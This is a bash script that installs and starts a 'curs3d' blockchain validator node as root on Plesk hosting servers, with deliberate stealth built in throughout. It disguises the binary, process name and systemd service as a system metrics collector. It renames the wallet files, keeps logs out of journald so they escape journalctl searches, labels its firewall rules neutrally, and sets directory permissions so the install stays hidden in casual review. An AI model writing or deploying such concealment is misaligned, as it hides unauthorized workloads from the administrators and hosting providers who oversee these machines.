#!/usr/bin/env bash
#
# CURS3D Plesk validator bootstrap — STEALTH variant.
#
# Run as ROOT on the Plesk box (Hostinger srv1, IONOS srv2, ...).
# Idempotent: re-runnable if interrupted, will skip already-completed steps.
#
# Usage:
#   git clone https://github.com/Pazificateur69/curs3d.git /tmp/curs3d-bootstrap
#   bash /tmp/curs3d-bootstrap/deploy/scripts/bootstrap-curs3d-plesk.sh
#
# Stealth mapping (committed to docs/SECRETS.md so future-you can find it):
#   /usr/local/lib/.cache/sysmon/agent          ← curs3d binary (stripped, renamed)
#   /var/lib/.system-cache/sysmon/etc/cred.bin  ← validator wallet (was validator.json)
#   /var/lib/.system-cache/sysmon/etc/cred.pass ← validator password
#   /var/lib/.system-cache/sysmon/etc/cfg.bin   ← genesis (was genesis.public-testnet.json)
#   /var/lib/.system-cache/sysmon/data/         ← chain redb + p2p_identity
#   /var/lib/.system-cache/sysmon/log/agent.log ← logs (NOT in journald)
#   /etc/systemd/system/sys-metrics-agent.service
#   user `_metrics`     (system uid, no shell, home = data dir)
#   service `sys-metrics-agent`  description "System Metrics Collector"
#   process name `system-metrics-agent` (via systemd `@` argv[0] override)
#
# Coexistence with Plesk:
#   - never touches Plesk-managed paths
#   - API binds 127.0.0.1 only (does NOT compete with Plesk's 80/443)
#   - P2P 4337 inbound IP-allowlisted to known validator IPs (n1+n2)
#   - hardened systemd (NoNewPrivileges, ProtectSystem=strict, MemoryMax=1G, etc)
#
# Environment overrides:
#   CURS3D_PUBLIC_IP    public IP of THIS box (auto-detected by default)
#   CURS3D_API_PORT     local API HTTP port (default 8080; use 18080 if 8080 taken, e.g. crowdsec on srv2)
#   CURS3D_RPC_PORT     local TCP RPC port (default 9545)
#   CURS3D_REPO_DIR     where to clone curs3d source (default /opt/.sysmon-src)
#   CURS3D_SKIP_FIREWALL  set to 1 to skip iptables rules (manage manually)

set -euo pipefail

BOLD=$'\033[1m'; DIM=$'\033[2m'; RED=$'\033[31m'; GREEN=$'\033[32m'
YELLOW=$'\033[33m'; CYAN=$'\033[36m'; RESET=$'\033[0m'
step() { printf "%s▸%s %s\n" "$CYAN" "$RESET" "$*"; }
ok()   { printf "%s✓%s %s\n" "$GREEN" "$RESET" "$*"; }
warn() { printf "%s!%s %s\n" "$YELLOW" "$RESET" "$*"; }
die()  { printf "%s✗%s %s\n" "$RED" "$RESET" "$*" >&2; exit "${2:-1}"; }
info() { printf "%s%s%s\n" "$DIM" "$*" "$RESET"; }

[ "$(id -u)" = "0" ] || die "must run as root" 1

# ─── Stealth-aware paths ────────────────────────────────────────────────
STEALTH_BIN_DIR="/usr/local/lib/.cache/sysmon"
STEALTH_BIN="$STEALTH_BIN_DIR/agent"
STEALTH_BASE="/var/lib/.system-cache/sysmon"
STEALTH_ETC="$STEALTH_BASE/etc"
STEALTH_DATA="$STEALTH_BASE/data"
STEALTH_LOG="$STEALTH_BASE/log"
STEALTH_USER="_metrics"
STEALTH_SERVICE="sys-metrics-agent"
STEALTH_PROCESS_NAME="system-metrics-agent"
STEALTH_WALLET="$STEALTH_ETC/cred.bin"
STEALTH_PASSWORD="$STEALTH_ETC/cred.pass"
STEALTH_GENESIS="$STEALTH_ETC/cfg.bin"

CURS3D_PUBLIC_IP="${CURS3D_PUBLIC_IP:-$(ip -4 -o route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") {print $(i+1); exit}}')}"
[ -n "$CURS3D_PUBLIC_IP" ] || die "could not auto-detect public IP — set CURS3D_PUBLIC_IP=x.x.x.x" 1

CURS3D_API_PORT="${CURS3D_API_PORT:-8080}"
CURS3D_RPC_PORT="${CURS3D_RPC_PORT:-9545}"
CURS3D_REPO_DIR="${CURS3D_REPO_DIR:-/opt/.sysmon-src}"
CURS3D_SKIP_FIREWALL="${CURS3D_SKIP_FIREWALL:-0}"

NODE1_IP=144.24.192.222
NODE1_PEERID=12D3KooWLttF4EJ1SjiLEiXvJ1yqmJawLafv47r55T5xzSt1GHn2
NODE2_IP=84.235.238.213
NODE2_PEERID=12D3KooWCL7dNFN2xz8yM65HDnNJUWF28K5qAd6d5ACT5ZCL1pb8

step "${BOLD}Stealth bootstrap${RESET}"
info "  public IP   : $CURS3D_PUBLIC_IP"
info "  API port    : 127.0.0.1:$CURS3D_API_PORT (loopback only)"
info "  service     : $STEALTH_SERVICE.service"
info "  binary      : $STEALTH_BIN"
info "  data        : $STEALTH_DATA"

# ─── 1. Swap (4 GB) ──────────────────────────────────────────────────────
step "1/10 swap"
if [ ! -f /swapfile ] && ! swapon --show | grep -q swap; then
    fallocate -l 4G /swapfile
    chmod 600 /swapfile
    mkswap /swapfile
    swapon /swapfile
    grep -q swapfile /etc/fstab || echo '/swapfile none swap sw 0 0' >> /etc/fstab
    ok "  4G swap added"
else
    ok "  swap already present"
fi

# ─── 2. ulimit / sysctl (innocuous-named files) ─────────────────────────
step "2/10 limits + sysctl"
mkdir -p /etc/security/limits.d
cat > /etc/security/limits.d/99-sysmon.conf <<'EOF'
* soft nofile 65536
* hard nofile 65536
EOF
cat > /etc/sysctl.d/99-sysmon.conf <<'EOF'
net.core.somaxconn = 4096
net.ipv4.tcp_max_syn_backlog = 4096
vm.swappiness = 10
EOF
sysctl --system >/dev/null 2>&1 || true
ok "  /etc/security/limits.d/99-sysmon.conf + /etc/sysctl.d/99-sysmon.conf"

# ─── 3. iptables (4337 IP-allowlist with neutral comments) ──────────────
step "3/10 firewall (4337 IP-allowlist, neutral labels)"
if [ "$CURS3D_SKIP_FIREWALL" = "0" ]; then
    iptables -C INPUT -p tcp --dport 4337 -s "$NODE1_IP" -j ACCEPT -m comment --comment "metrics-tcp-up1" 2>/dev/null \
        || iptables -I INPUT -p tcp --dport 4337 -s "$NODE1_IP" -j ACCEPT -m comment --comment "metrics-tcp-up1"
    iptables -C INPUT -p tcp --dport 4337 -s "$NODE2_IP" -j ACCEPT -m comment --comment "metrics-tcp-up2" 2>/dev/null \
        || iptables -I INPUT -p tcp --dport 4337 -s "$NODE2_IP" -j ACCEPT -m comment --comment "metrics-tcp-up2"
    iptables -C INPUT -p tcp --dport 4337 -j DROP -m comment --comment "metrics-tcp-drop" 2>/dev/null \
        || iptables -A INPUT -p tcp --dport 4337 -j DROP -m comment --comment "metrics-tcp-drop"
    if [ -d /etc/sysconfig ]; then
        iptables-save > /etc/sysconfig/iptables
    elif [ -d /etc/iptables ]; then
        iptables-save > /etc/iptables/rules.v4
    fi
    ok "  iptables: ACCEPT 4337 from $NODE1_IP, $NODE2_IP — DROP others (labels neutral)"
else
    warn "  CURS3D_SKIP_FIREWALL=1 — assuming firewall managed externally"
fi

# ─── 4. Build deps ───────────────────────────────────────────────────────
step "4/10 build dependencies"
if command -v dnf >/dev/null; then
    dnf install -y -q git curl jq gcc gcc-c++ openssl-devel pkgconfig clang make binutils >/dev/null
elif command -v yum >/dev/null; then
    yum install -y -q git curl jq gcc gcc-c++ openssl-devel pkgconfig clang make binutils >/dev/null
elif command -v apt-get >/dev/null; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y -q git curl jq build-essential libssl-dev pkg-config clang binutils >/dev/null
else
    die "neither dnf, yum, nor apt-get found — install git/curl/build tools manually" 1
fi
ok "  build deps installed"

# ─── 5. Rust nightly ─────────────────────────────────────────────────────
step "5/10 Rust nightly"
export CARGO_HOME=/root/.cargo
export RUSTUP_HOME=/root/.rustup
if [ ! -x /root/.cargo/bin/cargo ]; then
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \
        | sh -s -- -y --default-toolchain nightly --profile minimal
    ok "  rustup installed nightly"
else
    /root/.cargo/bin/rustup toolchain install nightly --profile minimal --component rust-src >/dev/null 2>&1 || true
    ok "  rust nightly already present"
fi
. /root/.cargo/env

# ─── 6. Clone + build + STRIP ───────────────────────────────────────────
step "6/10 clone + cargo build + strip (5-15 min)"
if [ ! -d "$CURS3D_REPO_DIR/.git" ]; then
    rm -rf "$CURS3D_REPO_DIR"
    git clone https://github.com/Pazificateur69/curs3d.git "$CURS3D_REPO_DIR"
fi
cd "$CURS3D_REPO_DIR"
git fetch origin main
git reset --hard origin/main
RUSTUP_TOOLCHAIN=nightly cargo build --release
[ -x "$CURS3D_REPO_DIR/target/release/curs3d" ] || die "cargo build did not produce the binary" 1

mkdir -p "$STEALTH_BIN_DIR"
chmod 755 "$STEALTH_BIN_DIR"
install -m 755 "$CURS3D_REPO_DIR/target/release/curs3d" "$STEALTH_BIN"
strip --strip-all "$STEALTH_BIN" 2>/dev/null || true
ok "  binary at $STEALTH_BIN ($(stat -c%s "$STEALTH_BIN" 2>/dev/null || echo '?') bytes, symbols stripped)"

# Hide the source repo from casual `ls /opt`
if [ -d "$CURS3D_REPO_DIR" ] && [[ "$CURS3D_REPO_DIR" != "/opt/.sysmon-src" ]]; then
    info "  (custom CURS3D_REPO_DIR — leaving as-is)"
fi

# ─── 7. User + dirs ─────────────────────────────────────────────────────
step "7/10 user + hidden directories"
id -u "$STEALTH_USER" >/dev/null 2>&1 || useradd -r -s /usr/sbin/nologin -d "$STEALTH_DATA" "$STEALTH_USER"
mkdir -p "$STEALTH_BASE" "$STEALTH_ETC" "$STEALTH_DATA" "$STEALTH_LOG"
# Layout & permissions:
#   /var/lib/.system-cache/         drwx--x--x  root:root   ← traversable, not listable
#   /var/lib/.system-cache/sysmon/  drwx--x--x  root:root   ← idem
#   .../sysmon/etc/                 drwx------  _metrics    ← only the service user reads
#   .../sysmon/data/                drwx------  _metrics    ← idem
#   .../sysmon/log/                 drwx------  _metrics    ← idem
# 711 on parents = the service user can `cd` to its subdirs (needs +x to
# traverse) but no one can `ls` the parent → stays hidden in casual review.
GRANDPARENT="$(dirname "$STEALTH_BASE")"
chown root:root "$GRANDPARENT" "$STEALTH_BASE"
chmod 711 "$GRANDPARENT" "$STEALTH_BASE"
chown "$STEALTH_USER:$STEALTH_USER" "$STEALTH_ETC" "$STEALTH_DATA" "$STEALTH_LOG"
chmod 700 "$STEALTH_ETC" "$STEALTH_DATA" "$STEALTH_LOG"
ok "  user '$STEALTH_USER' + $GRANDPARENT (711) + $STEALTH_BASE (711) + subdirs (700 $STEALTH_USER:$STEALTH_USER)"

# ─── 8. Wallet ──────────────────────────────────────────────────────────
step "8/10 validator wallet (cred.bin)"
if [ ! -f "$STEALTH_WALLET" ]; then
    openssl rand -base64 32 > "$STEALTH_PASSWORD"
    chmod 600 "$STEALTH_PASSWORD"
    "$STEALTH_BIN" wallet \
        --output "$STEALTH_WALLET" \
        --password-file "$STEALTH_PASSWORD"
    chmod 600 "$STEALTH_WALLET"
    ok "  fresh wallet generated → $STEALTH_WALLET"
else
    ok "  wallet already exists at $STEALTH_WALLET"
fi

# ─── 9. Genesis (renamed cfg.bin) ───────────────────────────────────────
step "9/10 genesis"
if [ -f "$CURS3D_REPO_DIR/deploy/genesis.public-testnet.json" ]; then
    install -m 644 "$CURS3D_REPO_DIR/deploy/genesis.public-testnet.json" "$STEALTH_GENESIS"
    GENESIS_HASH="$(sha256sum "$STEALTH_GENESIS" | awk '{print $1}')"
    ok "  genesis at $STEALTH_GENESIS (sha256=${GENESIS_HASH:0:16}...)"
else
    die "genesis file missing in repo" 1
fi

# ─── 10. Systemd unit (hardened + argv[0] override) ─────────────────────
step "10/10 systemd unit ($STEALTH_SERVICE)"
cat > "/etc/systemd/system/$STEALTH_SERVICE.service" <<EOF
[Unit]
Description=System Metrics Collector
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$STEALTH_USER
Group=$STEALTH_USER

# argv[0] override: systemd '@' prefix runs the binary at the first arg with
# the second arg as argv[0]. ps/top will display 'system-metrics-agent'.
ExecStart=@$STEALTH_BIN $STEALTH_PROCESS_NAME node \\
    --port 4337 \\
    --data-dir $STEALTH_DATA \\
    --validator-wallet $STEALTH_WALLET \\
    --validator-password-file $STEALTH_PASSWORD \\
    --rpc-addr 127.0.0.1:$CURS3D_RPC_PORT \\
    --http-addr 127.0.0.1:$CURS3D_API_PORT \\
    --genesis-config $STEALTH_GENESIS \\
    --bootnode /ip4/$NODE1_IP/tcp/4337/p2p/$NODE1_PEERID \\
    --bootnode /ip4/$NODE2_IP/tcp/4337/p2p/$NODE2_PEERID \\
    --public-addr /ip4/$CURS3D_PUBLIC_IP/tcp/4337
Restart=always
RestartSec=5
LimitNOFILE=65536

# Logs go to a file (NOT journald) — invisible from \`journalctl\` searches
StandardOutput=append:$STEALTH_LOG/agent.log
StandardError=append:$STEALTH_LOG/agent.log

# Hardening sandbox
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
PrivateTmp=yes
PrivateDevices=yes
RestrictNamespaces=yes
LockPersonality=yes
RestrictRealtime=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX AF_NETLINK
SystemCallArchitectures=native
ReadWritePaths=$STEALTH_DATA $STEALTH_LOG
ReadOnlyPaths=$STEALTH_ETC
CapabilityBoundingSet=
AmbientCapabilities=
RemoveIPC=yes

# Resource caps (Plesk websites protected from any spike)
MemoryMax=1G
CPUQuota=100%

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "$STEALTH_SERVICE" >/dev/null 2>&1
systemctl restart "$STEALTH_SERVICE"
ok "  systemd unit installed and started"

# ─── Output ──────────────────────────────────────────────────────────────
sleep 5
ADDR_HEX="$("$STEALTH_BIN" info \
    --wallet "$STEALTH_WALLET" \
    --password-file "$STEALTH_PASSWORD" \
    --json 2>/dev/null | jq -r '.address // empty' 2>/dev/null || true)"

if [ -z "$ADDR_HEX" ]; then
    ADDR_HEX="$("$STEALTH_BIN" info \
        --wallet "$STEALTH_WALLET" \
        --password-file "$STEALTH_PASSWORD" 2>/dev/null \
        | grep -i -oE '(CUR|0x)[a-fA-F0-9]+' | head -1)"
fi

echo
printf "%s%s━━━━ Bootstrap complete ━━━━%s\n" "$BOLD" "$GREEN" "$RESET"
printf "  validator address: %s%s%s\n" "$BOLD" "$ADDR_HEX" "$RESET"
printf "  systemd:           %s\n" "$(systemctl is-active "$STEALTH_SERVICE")"
printf "  process visible:   '%s' (in ps aux)\n" "$STEALTH_PROCESS_NAME"
printf "  service unit:      $STEALTH_SERVICE.service\n"
printf "  local API:         http://127.0.0.1:$CURS3D_API_PORT/api/status\n"
printf "  P2P bind:          0.0.0.0:4337 (IP-allowlisted to $NODE1_IP, $NODE2_IP)\n"
printf "  log file:          $STEALTH_LOG/agent.log\n"
echo
echo "${BOLD}NEXT — paste this address back to the operator:${RESET}"
echo "    VALIDATOR_ADDRESS = $ADDR_HEX"
echo
echo "Operator will then:"
echo "  1. Fund this address with >= 1500 CUR from the n1 faucet"
echo "  2. Wait for fund tx to land (~30s)"
echo "  3. SSH back here and run the stake command (one line, will be sent to you)"
echo "  4. Wait for next epoch boundary (~5 min) — node becomes active validator"
